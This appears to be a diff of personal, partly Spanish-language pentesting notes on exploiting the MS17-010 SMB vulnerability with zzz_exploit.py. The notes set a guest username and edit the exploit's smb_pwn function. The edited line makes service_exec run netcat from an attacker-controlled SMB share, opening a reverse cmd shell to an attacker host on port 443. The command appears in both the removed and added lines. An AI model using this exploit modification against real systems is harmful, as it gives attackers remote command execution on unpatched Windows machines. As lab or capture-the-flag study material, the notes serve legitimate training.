@@ -82,8 +82,8 @@ google::  ms17-010  zzz_exploit.py                #/#/#/ github.com/worawit/MS17
  :: ##linea 33  USERNAME = ''  ==>> USERNAME = 'guest'
  :: ##buscamos en vim 'cmd' (vim:: /cmd)  ##func[on smb_pwn
       
-	    service_exec(conn, r'cmd /c \\ipKali_here\smbFolder\nc.exe -e cmd ipKali_here 443')   ## si 2 ipKali :v
-
+	    service_exec(conn, r'cmd /c \\ipKali_here\smbFolder\nc.exe -e cmd ipKali_here 443')   ## si 2 ipKali , el segundo ipKali_here no lleva   //   ojo...!!!
+                                                                        
 
 
 
